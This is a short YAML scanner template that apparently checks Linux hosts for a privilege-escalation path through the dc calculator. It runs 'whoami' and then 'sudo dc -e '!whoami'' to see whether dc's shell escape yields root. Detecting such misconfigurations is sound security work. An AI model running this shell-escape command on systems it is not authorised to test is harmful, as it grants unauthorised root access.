code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'dc -e ''!whoami''

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    type: dsl
  matchers-condition: and
  source: 'sudo dc -e ''!whoami''

    '
id: privesc-dc
info:
  author: daffainfo
  description: 'dc is a command-line calculator in Unix and Unix-like operating systems.
    It uses reverse Polish notation (RPN) and provides a simple and efficient way
    to perform arithmetic operations from the command line. It can be used for basic
    and advanced mathematical calculations, making it a handy tool for scripting and
    quick calculations in the terminal.

    '
  metadata:
    max-request: 3
    verified: true
  name: dc - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/dc/
  severity: high
  tags: code,linux,dc,privesc,local
self-contained: true
